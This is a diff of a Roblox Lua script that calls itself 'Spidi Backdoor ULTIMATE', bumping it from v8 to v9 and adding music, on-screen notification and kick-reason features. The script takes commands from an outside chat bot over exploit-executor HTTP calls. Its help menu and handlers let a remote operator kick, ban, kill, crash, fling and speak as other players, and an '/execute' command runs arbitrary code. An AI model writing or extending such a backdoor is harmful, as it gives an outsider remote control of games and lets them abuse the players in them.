@@ -24,6 +24,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TextChatService = game:GetService("TextChatService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local RunService = game:GetService("RunService")
+local SoundService = game:GetService("SoundService")
 
 local function httpRequest(url, method, headers, body)
     local f = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
@@ -54,7 +55,7 @@ local function getChatId()
     return false
 end
 
--- ==================== БАЗА ПОЛЬЗОВАТЕЛЕЙ СКРИПТА ====================
+-- ==================== БАЗА ПОЛЬЗОВАТЕЛЕЙ ====================
 local scriptUsers = {}
 
 local function addScriptUser(player)
@@ -85,7 +86,6 @@ local function updateScriptUsers()
     end
 end
 
--- ==================== ПОИСК ИГРОКА (ТОЛЬКО ПОЛЬЗОВАТЕЛИ) ====================
 local function findPlayer(input)
     if not input or input == "" then
         return nil, "❌ Введи ник или номер"
@@ -119,7 +119,7 @@ local function findPlayer(input)
         end
         return nil, "Найдено несколько: "..table.concat(names, ", ")
     else
-        return nil, "Игрок не найден (скрипт не активен)"
+        return nil, "Игрок не найден"
     end
 end
 
@@ -135,7 +135,31 @@ local function getScriptUserList()
     return list
 end
 
--- ==================== КД НА СООБЩЕНИЯ ====================
+-- ==================== МУЗЫКА ====================
+local function playMusic(soundId)
+    local oldSound = SoundService:FindFirstChild("ClientMusic")
+    if oldSound then oldSound:Destroy() end
+
+    local sound = Instance.new("Sound")
+    sound.Name = "ClientMusic"
+    sound.SoundId = "rbxassetid://" .. tostring(soundId)
+    sound.Volume = 1
+    sound.Looped = true
+    sound.Parent = SoundService
+    sound:Play()
+end
+
+local function stopMusic()
+    local sound = SoundService:FindFirstChild("ClientMusic")
+    if sound then
+        sound:Stop()
+        sound:Destroy()
+        return true
+    end
+    return false
+end
+
+-- ==================== КД ====================
 local messageCooldown = {}
 local function canSendMessage(player)
     local userId = player.UserId
@@ -275,50 +299,113 @@ local function unspinPlayer(target)
     return false
 end
 
+local function showNotification(target, title, text, duration)
+    duration = duration or 5
+    local gui = target:FindFirstChild("PlayerGui")
+    if not gui then return end
+    
+    local screen = Instance.new("ScreenGui")
+    screen.Name = "SpidiNotif"
+    screen.ResetOnSpawn = false
+    screen.Parent = gui
+    
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 400, 0, 60)
+    frame.Position = UDim2.new(0.5, -200, 0, 20)
+    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    frame.BackgroundTransparency = 0.1
+    frame.BorderSizePixel = 0
+    frame.Parent = screen
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = frame
+    
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(0, 255, 0)
+    stroke.Thickness = 2
+    stroke.Parent = frame
+    
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Size = UDim2.new(1, -20, 0, 25)
+    titleLabel.Position = UDim2.new(0, 10, 0, 5)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = title or "Spidi Backdoor"
+    titleLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+    titleLabel.TextSize = 16
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    titleLabel.Parent = frame
+    
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(1, -20, 0, 25)
+    textLabel.Position = UDim2.new(0, 10, 0, 28)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Text = text or ""
+    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    textLabel.TextSize = 14
+    textLabel.Font = Enum.Font.Gotham
+    textLabel.TextXAlignment = Enum.TextXAlignment.Left
+    textLabel.TextWrapped = true
+    textLabel.Parent = frame
+    
+    frame.BackgroundTransparency = 1
+    frame.Position = UDim2.new(0.5, -200, 0, -80)
+    game:GetService("TweenService"):Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        BackgroundTransparency = 0.1,
+        Position = UDim2.new(0.5, -200, 0, 20)
+    }):Play()
+    
+    game:GetService("Debris"):AddItem(screen, duration)
+end
+
 -- ==================== ОБРАБОТЧИК КОМАНД ====================
 local function handleCommand(cmd, args, username)
     local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
     
     if cmd == "start" then
-        sendMessage("✅ Spidi Backdoor ULTIMATE v8 активирован!\n"..info)
+        sendMessage("✅ Spidi Backdoor ULTIMATE v9 активирован!\n"..info)
         return
     end
     
     if cmd == "help" then
-        sendMessage("📋 <b>КОМАНДЫ SPIDI v8:</b>\n\n"..
-            "<b>👤 ПОЛЬЗОВАТЕЛИ СКРИПТА:</b>\n"..
-            "/players - список пользователей скрипта\n"..
-            "/kick [ник/номер] - кикнуть\n"..
-            "/ban [ник/номер] - забанить\n"..
-            "/unban [ник/номер] - разбанить\n"..
-            "/kill [ник/номер] - убить\n"..
-            "/freeze [ник/номер] - заморозить\n"..
-            "/unfreeze [ник/номер] - разморозить\n"..
-            "/fly [ник/номер] - полететь\n"..
-            "/unfly [ник/номер] - отключить полет\n"..
-            "/crash [ник/номер] - крашнуть\n"..
-            "/fling [ник/номер] - флинг\n"..
+        sendMessage("📋 <b>КОМАНДЫ SPIDI v9:</b>\n\n"..
+            "<b>👤 ПОЛЬЗОВАТЕЛИ:</b>\n"..
+            "/players - список пользователей\n"..
+            "/kick [ник] [причина] - кикнуть\n"..
+            "/ban [ник] [причина] - забанить\n"..
+            "/unban [ник] - разбанить\n"..
+            "/kill [ник] - убить\n"..
+            "/freeze [ник] - заморозить\n"..
+            "/unfreeze [ник] - разморозить\n"..
+            "/fly [ник] - полететь\n"..
+            "/unfly [ник] - отключить полет\n"..
+            "/crash [ник] - крашнуть\n"..
+            "/fling [ник] - флинг\n"..
             "/teleport [ник1] [ник2] - телепорт\n"..
             "/bring [ник1] [ник2] - притянуть\n"..
-            "/loopkill [ник/номер] - бесконечный килл\n"..
-            "/stun [ник/номер] - оглушить (3 сек)\n"..
-            "/jump [ник/номер] - прыжок\n"..
-            "/spin [ник/номер] [скорость] - крутить\n"..
-            "/unspin [ник/номер] - остановить вращение\n"..
-            "/explode [ник/номер] - взорвать\n"..
-            "/des [ник/номер] - дезориентация (3 сек)\n"..
-            "/warp [ник/номер] [1-10] - размыть экран\n"..
-            "/unwarp [ник/номер] - убрать размытие\n\n"..
+            "/loopkill [ник] - бесконечный килл\n"..
+            "/stun [ник] - оглушить (3 сек)\n"..
+            "/jump [ник] - прыжок\n"..
+            "/spin [ник] [скорость] - крутить\n"..
+            "/unspin [ник] - остановить вращение\n"..
+            "/explode [ник] - взорвать\n"..
+            "/des [ник] - дезориентация (3 сек)\n"..
+            "/warp [ник] [1-10] - размыть экран\n"..
+            "/unwarp [ник] - убрать размытие\n\n"..
+            "<b>🎵 МУЗЫКА:</b>\n"..
+            "/music [айди] - играть музыку\n"..
+            "/unmusic - выключить музыку\n\n"..
             "<b>💬 ЧАТ:</b>\n"..
-            "/say [ник/номер] [текст] - сказать от имени\n"..
-            "/spam [ник/номер] [кол-во] [текст] - спам\n"..
-            "/message [ник/номер] [текст] - сообщение\n\n"..
+            "/say [ник] [текст] - сказать от имени\n"..
+            "/spam [ник] [кол-во] [текст] - спам\n"..
+            "/message [ник] [текст] - сообщение\n\n"..
             "<b>📊 ИНФО:</b>\n"..
             "/players - список пользователей\n"..
             "/server - инфо о сервере\n"..
             "/rejoin - перезайти\n"..
             "/execute [код] - выполнить код\n"..
-            "/setfps - ограничить FPS (toggle)\n"..
+            "/setfps - ограничить FPS\n"..
             "/help - помощь")
         return
     end
@@ -366,6 +453,27 @@ local function handleCommand(cmd, args, username)
             sendMessage("✅ Код выполнен\n"..info)
         else
             sendMessage("❌ Ошибка: "..tostring(res))
+        end
+        return
+    end
+    
+    -- ========== МУЗЫКА ==========
+    if cmd == "music" then
+        local id = args[1]
+        if not id then
+            sendMessage("❌ /music [айди]")
+            return
+        end
+        playMusic(id)
+        sendMessage("🎵 Музыка включена! ID: "..id)
+        return
+    end
+    
+    if cmd == "unmusic" then
+        if stopMusic() then
+            sendMessage("🔇 Музыка выключена!")
+        else
+            sendMessage("❌ Музыка не играет")
         end
         return
     end
@@ -438,11 +546,7 @@ local function handleCommand(cmd, args, username)
             sendMessage("⏳ Подожди 0.3 сек перед следующим сообщением")
             return
         end
-        StarterGui:SetCore("SendNotification", {
-            Title = "📩 Сообщение от Spidi",
-            Text = msg,
-            Duration = 6
-        })
+        showNotification(target, "📩 Сообщение от Spidi", msg, 6)
         sendMessage("✅ Сообщение <b>"..target.Name.."</b>: "..msg)
         return
     end
@@ -480,7 +584,7 @@ local function handleCommand(cmd, args, username)
         return
     end
     
-    -- Обычные команды с одним игроком
+    -- ========== ОБЫЧНЫЕ КОМАНДЫ ==========
     local name = args[1]
     if not name then
         sendMessage("❌ Укажи ник или номер игрока")
@@ -498,14 +602,22 @@ local function handleCommand(cmd, args, username)
     local humanoid = char and char:FindFirstChild("Humanoid")
     
     if cmd == "kick" then
-        target:Kick("Kicked by Spidi Backdoor")
-        sendMessage("✅ Кикнут: <b>"..target.Name.."</b>")
+        local reason = table.concat(args, " ", 2)
+        if reason == "" or reason == name then
+            reason = "No reason"
+        end
+        target:Kick("Kicked by Spidi Backdoor: "..reason)
+        sendMessage("✅ Кикнут: <b>"..target.Name.."</b> (Причина: "..reason..")")
         return
     end
     
     if cmd == "ban" then
-        target:Kick("Banned by Spidi Backdoor")
-        sendMessage("✅ Забанен: <b>"..target.Name.."</b>")
+        local reason = table.concat(args, " ", 2)
+        if reason == "" or reason == name then
+            reason = "No reason"
+        end
+        target:Kick("Banned by Spidi Backdoor: "..reason)
+        sendMessage("✅ Забанен: <b>"..target.Name.."</b> (Причина: "..reason..")")
         return
     end
     
@@ -690,7 +802,7 @@ local function handleCommand(cmd, args, username)
     sendMessage("❌ Неизвестная команда. /help")
 end
 
--- ==================== УВЕДОМЛЕНИЕ О НОВЫХ ПОЛЬЗОВАТЕЛЯХ ====================
+-- ==================== УВЕДОМЛЕНИЯ ====================
 local oldPlayers = {}
 local function checkNewPlayers()
     for _, p in pairs(Players:GetPlayers()) do
@@ -722,7 +834,7 @@ local function pollUpdates()
                     local msg = update.message
                     if not CHAT_ID then
                         CHAT_ID = msg.chat.id
-                        sendMessage("✅ Spidi Backdoor ULTIMATE v8 запущен!\n👤 Hacker228")
+                        sendMessage("✅ Spidi Backdoor ULTIMATE v9 запущен!\n👤 Hacker228")
                     end
                     local text = msg.text
                     if text:sub(1,1) == "/" then
@@ -794,7 +906,7 @@ local function createGUI()
     title.BackgroundTransparency = 1
     title.Size = UDim2.new(1, 0, 0, 50)
     title.Position = UDim2.new(0, 0, 0, 10)
-    title.Text = "Spidi Backdoor ULTIMATE v8"
+    title.Text = "Spidi Backdoor ULTIMATE v9"
     title.TextColor3 = Color3.fromRGB(0, 255, 0)
     title.TextSize = 28
     title.Font = Enum.Font.GothamBold
@@ -805,7 +917,7 @@ local function createGUI()
     desc.BackgroundTransparency = 1
     desc.Size = UDim2.new(1, -40, 0, 80)
     desc.Position = UDim2.new(0, 20, 0, 70)
-    desc.Text = "Spidi Backdoor Active!\n/players - список пользователей"
+    desc.Text = "Spidi Backdoor Active!\n/music [айди] - играть музыку"
     desc.TextColor3 = Color3.fromRGB(0, 255, 0)
     desc.TextSize = 18
     desc.Font = Enum.Font.GothamBold
@@ -874,7 +986,6 @@ local function onCharacterChanged()
     end
 end
 
--- ==================== ЗАПУСК ====================
 createGUI()
 Players.LocalPlayer:GetPropertyChangedSignal("Character"):Connect(onCharacterChanged)
 
@@ -882,5 +993,5 @@ wait(3)
 getChatId()
 
 if CHAT_ID then
-    sendMessage("✅ Spidi Backdoor ULTIMATE v8 запущен!\n👤 Hacker228\n📋 /players - список пользователей\n📋 /help - все команды")
+    sendMessage("✅ Spidi Backdoor ULTIMATE v9 запущен!\n👤 Hacker228\n📋 /players - список пользователей\n🎵 /music [айди] - играть музыку")
 end
